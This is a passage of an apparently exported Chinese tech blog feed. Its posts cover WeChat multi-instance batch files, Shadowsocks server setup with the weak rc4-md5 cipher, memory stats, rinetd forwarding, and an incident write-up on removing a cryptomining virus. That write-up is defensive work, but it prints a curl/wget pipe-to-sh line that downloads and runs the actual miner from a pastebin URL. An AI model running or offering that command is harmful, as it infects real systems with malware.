3x7=21  4x7=28  5x7=35  6x7=42  7x7=49</span><br><span class="line">1x8=8   2x8=16  3x8=24  4x8=32  5x8=40  6x8=48  7x8=56  8x8=64</span><br><span class="line">1x9=9   2x9=18  3x9=27  4x9=36  5x9=45  6x9=54  7x9=63  8x9=72  9x9=81</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Shell脚本</category>
      </categories>
      <tags>
        <tag>Shell脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>电脑版微信怎么双开、多开</title>
    <url>/2020/10/19/%E7%94%B5%E8%84%91%E7%89%88%E5%BE%AE%E4%BF%A1%E6%80%8E%E4%B9%88%E5%8F%8C%E5%BC%80%E3%80%81%E5%A4%9A%E5%BC%80/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="电脑版微信怎么双开、多开"><a href="#电脑版微信怎么双开、多开" class="headerlink" title="电脑版微信怎么双开、多开"></a>电脑版微信怎么双开、多开</h1><p>微信几乎是人人必备的沟通交流工具，而且很多朋友还不止一个微信号。在用电脑登陆微信的时候，怎么样才能实现微信双开甚至多开呢？</p>
<h2 id="工具-原料"><a href="#工具-原料" class="headerlink" title="工具/原料"></a>工具/原料</h2><ul>
<li>电脑</li>
<li>电脑版微信</li>
<li>多个微信号</li>
</ul>
<h2 id="方法-步骤"><a href="#方法-步骤" class="headerlink" title="方法/步骤"></a>方法/步骤</h2><ol>
<li><p>首先我们要在电脑上安装一个PC版微信，直接在微信官网下载即可。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/19/%E7%94%B5%E8%84%91%E7%89%88%E5%BE%AE%E4%BF%A1%E6%80%8E%E4%B9%88%E5%8F%8C%E5%BC%80%E3%80%81%E5%A4%9A%E5%BC%80/image-20201019195955084.png" alt="image-20201019195955084"></p>
</li>
<li><p>新建一个txt文本文件，在文件中写入如下代码：</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">start</span> /d "C:\Program Files (x86)\Tencent\WeChat\" WeChat.exe</span><br><span class="line"></span><br><span class="line"><span class="built_in">start</span> /d "C:\Program Files (x86)\Tencent\WeChat\" WeChat.exe</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<p>保存文本文件。</p>
</li>
</ol>
<p>   这里需要注意的是：</p>
   <figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、<span class="built_in">start</span> /d "C:\Program Files (x86)\Tencent\WeChat\" WeChat.exe</span><br></pre></td></tr></table></figure>

<p>   这段代码复制几次，就多开几个微信。例如上面的这段代码，可以实现微信双开，如果要开3个微信，就要多复制一次，代码如下：</p>
   <figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">start</span> /d "C:\Program Files (x86)\Tencent\WeChat\" WeChat.exe</span><br><span class="line"><span class="built_in">start</span> /d "C:\Program Files (x86)\Tencent\WeChat\" WeChat.exe</span><br><span class="line"><span class="built_in">start</span> /d "C:\Program Files (x86)\Tencent\WeChat\" WeChat.exe</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<p>   多开4个、5个，同理。</p>
<p>   <img src= "/img/loading.gif" data-src="/2020/10/19/%E7%94%B5%E8%84%91%E7%89%88%E5%BE%AE%E4%BF%A1%E6%80%8E%E4%B9%88%E5%8F%8C%E5%BC%80%E3%80%81%E5%A4%9A%E5%BC%80/image-20201019200124332.png" alt="image-20201019200124332"></p>
<ol start="3">
<li><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span>、C:\Program Files (x86)\Tencent\WeChat\</span><br></pre></td></tr></table></figure>



</li>
</ol>
<p>   这一段代码，是微信的安装路径，如果你的微信是默认安装的，就不用更改。如果后面代码没有生效，你就要把正确的安装路径把这段代码替换掉。</p>
<p>   在桌面上，找到微信图标，右键–属性，就可以查看到你的微信安装路径，把这段路径代码放到上面的代码文件中即可。</p>
<p>   <img src= "/img/loading.gif" data-src="/2020/10/19/%E7%94%B5%E8%84%91%E7%89%88%E5%BE%AE%E4%BF%A1%E6%80%8E%E4%B9%88%E5%8F%8C%E5%BC%80%E3%80%81%E5%A4%9A%E5%BC%80/image-20201019200148758.png" alt="image-20201019200148758"></p>
<ol start="4">
<li><p>把文本文件重命名为wechat.bat，点击确定。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/19/%E7%94%B5%E8%84%91%E7%89%88%E5%BE%AE%E4%BF%A1%E6%80%8E%E4%B9%88%E5%8F%8C%E5%BC%80%E3%80%81%E5%A4%9A%E5%BC%80/image-20201019200200973.png" alt="image-20201019200200973"></p>
</li>
<li><p>双击wechat.bat，即可实现双开甚至多开。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/19/%E7%94%B5%E8%84%91%E7%89%88%E5%BE%AE%E4%BF%A1%E6%80%8E%E4%B9%88%E5%8F%8C%E5%BC%80%E3%80%81%E5%A4%9A%E5%BC%80/image-20201019200219552.png" alt="image-20201019200219552"></p>
<p>END</p>
</li>
</ol>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul>
<li>注意：C:\Program Files (x86)\Tencent\WeChat\ 这个是我的微信的安装路径，请用你自己的微信安装路劲替换这一段代码。</li>
<li>这个方法可以实现双开、三开、四个、多开，只再电脑端有效，实测，笔记本和台式机都是有效的。</li>
</ul>
]]></content>
      <categories>
        <category>生活小技巧</category>
      </categories>
      <tags>
        <tag>生活小技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>科学上网</title>
    <url>/2018/10/29/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="如何科学上网"><a href="#如何科学上网" class="headerlink" title="如何科学上网"></a>如何科学上网</h1><h2 id="一-墙与翻墙"><a href="#一-墙与翻墙" class="headerlink" title="一. 墙与翻墙"></a>一. 墙与翻墙</h2><h3 id="Q1-什么是”墙”"><a href="#Q1-什么是”墙”" class="headerlink" title="Q1: 什么是”墙”?"></a>Q1: 什么是”墙”?</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">防火长城（英语：Great Firewall of China，常用简称：GFW，中文也称中国国家防火墙或防火长城[1]，中国</span><br><span class="line">大陆民众俗称防火墙[2]），是对中国政府在其互联网边界审查系统（包括相关行政审查系统）的统称。此系统起步于</span><br><span class="line">1998年[3]，其英文名称得自于2002年5月17日Charles R. Smith所写的一篇关于中国网络审查的文章《The Great</span><br><span class="line">Firewall of China》[4]，取与Great Wall（长城）相谐的效果，简写为Great Firewall，缩写GFW[5]。随着使用</span><br><span class="line">的拓广，中文“墙”和英文“GFW”有时也被用作动词，网友所说的“被墙”即指被防火长城所屏蔽。</span><br><span class="line">--摘自维基百科</span><br></pre></td></tr></table></figure>

<h3 id="Q2-什么是”翻墙”"><a href="#Q2-什么是”翻墙”" class="headerlink" title="Q2: 什么是”翻墙”?"></a>Q2: 什么是”翻墙”?</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">突破网络审查或突破网络封锁，俗称翻墙（穿墙）或破网[1]，是指针对互联网审查封锁的限制，绕过相应的IP封</span><br><span class="line">锁、端口封锁、内容过滤、域名劫持等，实现对网络内容的访问。相应突破网络审查软件的叫法有：翻墙软件、破网软</span><br><span class="line">件、破墙软件和穿墙软件</span><br><span class="line">--摘自维基百科</span><br></pre></td></tr></table></figure>

<h3 id="Q3-为什么要翻墙"><a href="#Q3-为什么要翻墙" class="headerlink" title="Q3: 为什么要翻墙?"></a>Q3: 为什么要翻墙?</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">绝大多数人翻墙是因为很多曾经很常用的网站(如google、youtube[简称U2B]、twitter[推特]、国外众多新闻媒</span><br><span class="line">体的网站等)的被墙，为了取得相应的服务，只能翻墙。</span><br><span class="line">如有段时间GMail被全面封禁，导致很多需要使用GMail的用户(比如正在申请出国留学的孩纸、有国际业务需求的</span><br><span class="line">公司等)完全无法使用GMail。墙还可导致大多使用了google字体的网站加载速度变慢。实际上即使只使用国内的搜索引</span><br><span class="line">擎等，依然会被过滤掉相当一部分信息。</span><br><span class="line">再如有安卓应用开发需求的盆友若需要连接google来获取相应的API等，亦需翻墙才可。</span><br></pre></td></tr></table></figure>

<h3 id="Q4-如何翻墙"><a href="#Q4-如何翻墙" class="headerlink" title="Q4: 如何翻墙?"></a>Q4: 如何翻墙?</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">翻墙分为全局模式和局部模式。</span><br><span class="line">局部模式只影响浏览器或者用户指定的软件，灵活性较好，有SSH、socks代理(socks4/socks5)、IP代理等。</span><br><span class="line">全局模式则会影响所有软件,主要有VPN(比如应用广泛的OpenVPN，另外还有L2TP等)。</span><br><span class="line">但是，不管何种翻墙方式，其根本行为都是将要访问的数据加密传输，网络审查无法检查，得到数据包后本地解</span><br><span class="line">密，从而达到翻墙的目的。</span><br></pre></td></tr></table></figure>

<p>P.S: 本文只介绍局部代理中的socks5 </p>
<h2 id="二-使用SS实现科学上网"><a href="#二-使用SS实现科学上网" class="headerlink" title="二. 使用SS实现科学上网"></a>二. 使用SS实现科学上网</h2><p>shadowsocks是一个可穿透防火墙的快速代理, 简称ss。 </p>
<p>ss是主要由@clowwindy开发维护的一个基于socks5协议的开源项目，官网为shadowsocks.org(当然，没翻墙泥上不去的啦)，托管在github上。</p>
<p>国内vps(Virtual Private Server 虚拟专用服务器)主要面向有搭建网站需求的用户，配置中规中矩，价格上也不便宜。如果需要搭建自己的ss服务器，建议买一个国外的vps 。</p>
<h3 id="1-购买国外云服务器-略"><a href="#1-购买国外云服务器-略" class="headerlink" title="1.购买国外云服务器 (略)"></a>1.购买国外云服务器 (略)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">可以购买阿里云,腾讯云的香港或国外服务器,比较常见的还有搬瓦工服务器等</span><br></pre></td></tr></table></figure>

<h3 id="2-服务端安装-CentOS7-3"><a href="#2-服务端安装-CentOS7-3" class="headerlink" title="2.服务端安装(CentOS7.3)"></a>2.服务端安装(CentOS7.3)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> yum install python-setuptools &amp;&amp; easy_install pip</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> pip install shadowsocks</span></span><br></pre></td></tr></table></figure>

<h3 id="3-启动"><a href="#3-启动" class="headerlink" title="3.启动"></a>3.启动</h3><h4 id="启动方式一-直接启动"><a href="#启动方式一-直接启动" class="headerlink" title="启动方式一: 直接启动"></a>启动方式一: 直接启动</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ssserver -p 8000 -k mypassword -m rc4-md5 -d start</span></span><br><span class="line">选项说明:</span><br><span class="line">-p 端口</span><br><span class="line">-k 密码</span><br><span class="line">-m 加密方式</span><br><span class="line">-d 以守护进程的方式运行(后台运行)</span><br></pre></td></tr></table></figure>

<h4 id="启动方式二-使用配置文件启动"><a href="#启动方式二-使用配置文件启动" class="headerlink" title="启动方式二: 使用配置文件启动"></a>启动方式二: 使用配置文件启动</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">配置文件:</span><br><span class="line"><span class="meta">#</span><span class="bash"> vim /etc/shadowsocks.json</span></span><br><span class="line">&#123;</span><br><span class="line">"server":"0.0.0.0",</span><br><span class="line">"server_port":8388,</span><br><span class="line">"local_address": "127.0.0.1",</span><br><span class="line">"local_port":1080,</span><br><span class="line">"password":"mypassword",</span><br><span class="line">"timeout":300,</span><br><span class="line">"method":"rc4-md5"</span><br><span class="line">&#125;</span><br><span class="line">多用户的情况下可以这样配置:</span><br><span class="line"><span class="meta">#</span><span class="bash"> vim /etc/shadowsocks.json</span></span><br><span class="line">&#123;</span><br><span class="line">"server":"0.0.0.0"，</span><br><span class="line">"local_address": "127.0.0.1",</span><br><span class="line">"local_port":1080,</span><br><span class="line">"port_password": &#123;</span><br><span class="line">"8388": "password",</span><br><span class="line">"8387": "password",</span><br><span class="line">"8386": "password",</span><br><span class="line">"8385": "password"</span><br><span class="line">&#125;,</span><br><span class="line">"timeout":300,</span><br><span class="line">"method":"rc4-md5",</span><br><span class="line">"fast_open": false</span><br><span class="line">&#125;</span><br><span class="line">启动命令:</span><br><span class="line"><span class="meta">#</span><span class="bash"> ssserver -c /etc/shadowsocks.json -d start</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">解决rsyslogd占有率高:</span><br><span class="line"><span class="meta">#</span><span class="bash"> sed -i <span class="string">'s/^\$ModLoad imklog/#\$ModLoad imklog/g'</span> /etc/rsyslog.conf</span></span><br></pre></td></tr></table></figure>

<p>p.s: 云服务器要记得打开安全组策略</p>
<h2 id="客户端安装及配置"><a href="#客户端安装及配置" class="headerlink" title="客户端安装及配置"></a>客户端安装及配置</h2><p>软件下载: </p>
<p>windows: <a href="https://github.com/shadowsocks/shadowsocks-csharp" target="_blank" rel="noopener">https://github.com/shadowsocks/shadowsocks-csharp</a> </p>
<p>android: <a href="https://github.com/shadowsocks/shadowsocks-android/releases" target="_blank" rel="noopener">https://github.com/shadowsocks/shadowsocks-android/releases</a></p>
<p><img src= "/img/loading.gif" data-src="/2018/10/29/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/image-20200817191108214.png" alt="image-20200817191108214"></p>
<p>注意: 加密方式一定要和配置的相同</p>
]]></content>
      <categories>
        <category>shadowsocks</category>
      </categories>
      <tags>
        <tag>shadowsocks</tag>
        <tag>VPS</tag>
      </tags>
  </entry>
  <entry>
    <title>解析 free -m 命令及 buffer与cache区别与作用</title>
    <url>/2019/03/28/%E8%A7%A3%E6%9E%90%20free%20-m%20%E5%91%BD%E4%BB%A4%E5%8F%8A%20buffer%E4%B8%8Ecache%E5%8C%BA%E5%88%AB%E4%B8%8E%E4%BD%9C%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="解析-free-m-命令及-buffer与cache区别与作用"><a href="#解析-free-m-命令及-buffer与cache区别与作用" class="headerlink" title="解析 free -m 命令及 buffer与cache区别与作用"></a>解析 free -m 命令及 buffer与cache区别与作用</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# free -m</span><br><span class="line">             total       used       free     shared    buffers     cached</span><br><span class="line">Mem:          7870       3974       3896          0         96       2798</span><br><span class="line">-/+ buffers/cache:       1079       6791</span><br><span class="line">Swap:         8191         30       8161</span><br></pre></td></tr></table></figure>

<p>buffer定义：存储速度不同的设备间传输数据时候，慢的一方临时存放数据的一个缓冲区域—-占用的物理内存空间。常用于磁盘跟内存间加载数据<br>cache定义：位于cpu跟内存之间的高速缓存，用于存储I/O的最小单元—块。<br>综上可以理解为：</p>
<p><img src= "/img/loading.gif" data-src="/2019/03/28/%E8%A7%A3%E6%9E%90%20free%20-m%20%E5%91%BD%E4%BB%A4%E5%8F%8A%20buffer%E4%B8%8Ecache%E5%8C%BA%E5%88%AB%E4%B8%8E%E4%BD%9C%E7%94%A8/image-20200911160357099.png" alt="image-20200911160357099"></p>
<p>所以free -m 返回的结果就很好解释了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# free -m</span><br><span class="line">	***物理内存***   ***分配的内存***   ***未分配物理内存***  ***未用buffer*** ***未用cache***</span><br><span class="line">             total       used       free     shared    buffers     cached</span><br><span class="line">Mem:          7870       3974       3896          0         96       2798</span><br><span class="line">						***使用的缓存***   ***剩余可以使用的内存***</span><br><span class="line">-/+ buffers/cache:       1079       6791</span><br><span class="line">Swap:         8191         30       8161</span><br></pre></td></tr></table></figure>

<p>以上比较重要的是，平时我们查看可用内存为<strong>*\</strong>剩余可使用内存*<em>\</em>=*<em>\</em>未用buffer*<em>\</em> + *<em>\</em>未用cache*<em>**</em> +<strong><em>未分配物理内存</em></strong></p>
<p><strong><em>分配的内存</em></strong>=<strong>未用buffer</strong>+<strong><em>未用cache</em></strong>+<strong><em>使用的缓存</em></strong></p>
]]></content>
      <categories>
        <category>内存</category>
      </categories>
      <tags>
        <tag>内存</tag>
      </tags>
  </entry>
  <entry>
    <title>记服务器中招挖矿病毒排查过程(解决方案篇)</title>
    <url>/2019/02/22/%E8%AE%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E6%8B%9B%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E6%8E%92%E6%9F%A5%E8%BF%87%E7%A8%8B(%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E7%AF%87)/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="记服务器中招挖矿病毒排查过程-解决方案篇"><a href="#记服务器中招挖矿病毒排查过程-解决方案篇" class="headerlink" title="记服务器中招挖矿病毒排查过程(解决方案篇)"></a>记服务器中招挖矿病毒排查过程(解决方案篇)</h1><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>从昨日(20190221)中午起, 发现大量测试环境机器和一台线上机器疑似感染挖矿病毒(后来确认的确是门罗币挖矿病毒), 经过一天多的紧急排查, 已基本搞定了该病毒.</p>
<p>该病毒这两天疑似大规模爆发, 已经有几个其他公司的朋友中招, 也在网上看到一些帖子和提问.</p>
<p>下面先贴出梳理后的解决过程, 有时间再附上详细的分析过程.</p>
<h1 id="直观表现"><a href="#直观表现" class="headerlink" title="直观表现"></a>直观表现</h1><ul>
<li>top, ps -ef 无异常进程</li>
<li>load average 稳步飙升</li>
<li>netstat 命令被删除</li>
<li>尝试建立大量22端口, 6379端口的内网连接</li>
<li>crontab 被添加定时挖矿脚本, 删除无效</li>
</ul>
<p><img src= "/img/loading.gif" data-src="/2019/02/22/%E8%AE%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E6%8B%9B%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E6%8E%92%E6%9F%A5%E8%BF%87%E7%A8%8B(%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E7%AF%87)/image-20200911155303897.png" alt="image-20200911155303897"></p>
<h1 id="传播途径"><a href="#传播途径" class="headerlink" title="传播途径"></a>传播途径</h1><ul>
<li>Jenkins漏洞(or 弱密码?)侵入</li>
<li>尝试root用户ssh的免密登录</li>
<li>尝试redis内网登录</li>
</ul>
<h1 id="准备过程"><a href="#准备过程" class="headerlink" title="准备过程"></a>准备过程</h1><h2 id="获取busybox"><a href="#获取busybox" class="headerlink" title="获取busybox"></a>获取busybox</h2><p>因感染病毒后, ls等系统命令会被劫持, 需要busybox替代这些系统命令, 下面提供从busybox官方docker镜像中提取的静态编译版busybox过程.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run --rm -itv /tmp/:/tmp busybox:uclibc</span><br><span class="line">cp /bin/busybox /tmp</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>

<p>宿主机即获取到: <code>/tmp/busybox</code></p>
<h1 id="复现感染过程-docker环境被root感染模式"><a href="#复现感染过程-docker环境被root感染模式" class="headerlink" title="复现感染过程(docker环境被root感染模式)"></a>复现感染过程(docker环境被root感染模式)</h1><h2 id="docker与虚拟机环境有区别-病毒行为会受限"><a href="#docker与虚拟机环境有区别-病毒行为会受限" class="headerlink" title="docker与虚拟机环境有区别, 病毒行为会受限"></a>docker与虚拟机环境有区别, 病毒行为会受限</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run --rm -it -v /tmp:/tmp centos:latest</span><br><span class="line">yum install -y crontabs lsof e2fsprogs</span><br><span class="line">(curl -fsSL https://pastebin.com/raw/sByq0rym||wget -q -O- https://pastebin.com/raw/sByq0rym)|sh</span><br></pre></td></tr></table></figure>

<h2 id="使用busybox代替系统命令"><a href="#使用busybox代替系统命令" class="headerlink" title="使用busybox代替系统命令"></a>使用busybox代替系统命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">busybox top, busybox ps -ef</span><br></pre></td></tr></table></figure>

<p>此<code>busybox</code>为静态编译版, 不依赖so库, 系统的<code>ls</code>等命令已被通过so库的preload机制被病毒劫持, <code>ls</code>会导致<code>/etc/cron.d/root</code>文件被刷写为病毒定时执行命令.</p>
<h2 id="发现比系统命令多两个进程-进程个数跟cpu核数有关-耗尽了所有cpu资源"><a href="#发现比系统命令多两个进程-进程个数跟cpu核数有关-耗尽了所有cpu资源" class="headerlink" title="发现比系统命令多两个进程(进程个数跟cpu核数有关), 耗尽了所有cpu资源"></a>发现比系统命令多两个进程(进程个数跟cpu核数有关), 耗尽了所有cpu资源</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/tmp/ksoftirqds</span><br><span class="line">/tmp/watchdogs</span><br></pre></td></tr></table></figure>

<h1 id="查杀过程-系统命令已不可信-操作优先采用busybox"><a href="#查杀过程-系统命令已不可信-操作优先采用busybox" class="headerlink" title="查杀过程(系统命令已不可信, 操作优先采用busybox)"></a>查杀过程(系统命令已不可信, 操作优先采用busybox)</h1><h2 id="关闭crontab"><a href="#关闭crontab" class="headerlink" title="关闭crontab"></a>关闭crontab</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl stop crond</span><br></pre></td></tr></table></figure>

<h2 id="阻断内网传播"><a href="#阻断内网传播" class="headerlink" title="阻断内网传播"></a>阻断内网传播</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">上面提到, 该病毒会通过jenkins漏洞, ssh免密登录, redis免密or弱密码远程执行等方式传播, 在对机器杀毒的过程中, 首先更改相应端口, 避免被内网其它机器二次感染.</span><br></pre></td></tr></table></figure>

<h2 id="上传busybox"><a href="#上传busybox" class="headerlink" title="上传busybox"></a>上传busybox</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod +x busybox &amp;&amp; mv busybox /sbin/</span><br></pre></td></tr></table></figure>

<h2 id="写hosts-屏蔽病毒脚本下载"><a href="#写hosts-屏蔽病毒脚本下载" class="headerlink" title="写hosts, 屏蔽病毒脚本下载"></a>写hosts, 屏蔽病毒脚本下载</h2><p>busybox echo -e “\n0.0.0.0 pastebin.com\n0.0.0.0 thyrsi.com” &gt;&gt; /etc/hosts</p>
<h2 id="删除，创建，并锁定-crontab相关文件"><a href="#删除，创建，并锁定-crontab相关文件" class="headerlink" title="删除，创建，并锁定 crontab相关文件"></a>删除，创建，并锁定 crontab相关文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">busybox rm /var/spool/cron/root &amp;&amp; busybox touch /var/spool/cron/root &amp;&amp; busybox chattr +i  /var/spool/cron/root</span><br><span class="line">busybox rm /var/spool/cron/crontabs/root &amp;&amp; busybox touch /var/spool/cron/crontabs/root &amp;&amp; busybox chattr +i /var/spool/cron/crontabs/root </span><br><span class="line">busybox rm /etc/cron.d/root &amp;&amp; busybox touch /etc/cron.d/root &amp;&amp; busybox chattr +i /etc/cron.d/root</span><br></pre></td></tr></table></figure>

<p>备份重要的crontab，然后删除cron.d目录的其他文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">busybox rm -rf /etc/cron.d/*</span><br></pre></td></tr></table></figure>

<h2 id="检查并删除下面目录有异常文件"><a href="#检查并删除下面目录有异常文件" class="headerlink" title="检查并删除下面目录有异常文件"></a>检查并删除下面目录有异常文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">busybox ls /etc/cron.daily</span><br><span class="line">busybox ls /etc/cron.hourly</span><br><span class="line">busybox ls /etc/cron.monthly</span><br><span class="line">busybox ls /etc/cron.weekly</span><br></pre></td></tr></table></figure>

<h2 id="删除病毒相关执行文件和启动脚本"><a href="#删除病毒相关执行文件和启动脚本" class="headerlink" title="删除病毒相关执行文件和启动脚本"></a>删除病毒相关执行文件和启动脚本</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/busybox rm /sbin/watchdogs</span><br><span class="line">/busybox rm /usr/sbin/watchdogs</span><br><span class="line">/busybox rm /etc/init.d/watchdogs</span><br><span class="line"></span><br><span class="line">busybox find / -type f -name '*watchdogs*'|busybox xargs rm -f</span><br></pre></td></tr></table></figure>

<h2 id="删除病毒进程"><a href="#删除病毒进程" class="headerlink" title="删除病毒进程"></a>删除病毒进程</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">busybox pkill watchdogs</span><br><span class="line">busybox pkill ksoftirqds</span><br></pre></td></tr></table></figure>

<h2 id="删除被preload的so库"><a href="#删除被preload的so库" class="headerlink" title="删除被preload的so库"></a>删除被preload的so库</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">busybox rm /usr/local/lib/libioset.so</span><br><span class="line">busybox rm /etc/ld.so.preload</span><br><span class="line">busybox rm /etc/ld.so.cache</span><br></pre></td></tr></table></figure>

<h2 id="验证libioset-so被卸载"><a href="#验证libioset-so被卸载" class="headerlink" title="验证libioset.so被卸载"></a>验证libioset.so被卸载</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsof |grep usr/local/lib/libioset.so</span><br></pre></td></tr></table></figure>

<p>无输出, 则该动态链接库被卸载, 直接执行验证步骤;</p>
<p>有输出, kill掉占用的进程, 重复执行该步骤;</p>
<p>若反复执行后无法成功卸载该动态链接库, 请执行服务器重启操作.</p>
<h2 id="重启服务器"><a href="#重启服务器" class="headerlink" title="重启服务器"></a>重启服务器</h2><h1 id="验证步骤"><a href="#验证步骤" class="headerlink" title="验证步骤"></a>验证步骤</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">busybox top # 查看系统负载</span><br><span class="line">crontab -l  # 查看是否还有异常任务</span><br><span class="line">busybox chattr -i /etc/cron.d/root   # 过一段时间查看是否有异常任务写入</span><br></pre></td></tr></table></figure>

<p>如果没有成功，重复执行整个查杀过程，尽量在短时间内完成所有操作并重启，否则病毒会利用已加载的动态链接库恢复感染</p>
]]></content>
      <categories>
        <category>病毒</category>
      </categories>
      <tags>
        <tag>病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>通过rinetd实现端口转发来访问内网的服务</title>
    <url>/2019/11/03/%E9%80%9A%E8%BF%87rinetd%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%9D%A5%E8%AE%BF%E9%97%AE%E5%86%85%E7%BD%91%E7%9A%84%E6%9C%8D%E5%8A%A1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="通过rinetd实现端口转发来访问内网的服务"><a href="#通过rinetd实现端口转发来访问内网的服务" class="headerlink" title="通过rinetd实现端口转发来访问内网的服务"></a>通过rinetd实现端口转发来访问内网的服务</h1><p>官方源中不具有Rinetd，所以需要先安装三方源。</p>
<h2 id="配置三方源"><a href="#配置三方源" class="headerlink" title="配置三方源"></a>配置三方源</h2><p>32位系统</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vim /etc/yum.repos.d/nux-misc.repo</span></span><br><span class="line">[nux-misc]</span><br><span class="line">name=Nux Misc</span><br><span class="line">baseurl=http://li.nux.ro/download/nux/misc/el6/i386/</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://li.nux.ro/download/nux/RPM-GPG-KEY-nux.ro</span><br></pre></td></tr></table></figure>

<p>64位系统</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vim  /etc/yum.repos.d/nux-misc.repo:</span></span><br><span class="line">[nux-misc]</span><br><span class="line">name=Nux Misc</span><br><span class="line">baseurl=http://li.nux.ro/download/nux/misc/el6/x86_64/</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://li.nux.ro/download/nux/RPM-GPG-KEY-nux.ro</span><br></pre></td></tr></table></figure>

<h2 id="安装Rinetd"><a href="#安装Rinetd" class="headerlink" title="安装Rinetd"></a>安装Rinetd</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> yum --enablerepo=nux-misc install rinetd</span></span><br></pre></td></tr></table></figure>

<p>Ubuntu</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> apt-get install rinetd</span></span><br></pre></td></tr></table></figure>

<p>编译安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wget http://www.boutell.com/rinetd/http/rinetd.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mkdir  -p /usr/man/man8   <span class="comment">#默认会把man文件放么/usr/man/man8下面，如果没有这个目录会报目前不存在，但不影响使用. </span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make &amp;&amp; make install</span></span><br></pre></td></tr></table></figure>

<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>配置端口转发的配置文件在/etc/rinetd.conf</p>
<p>配置文件格式</p>
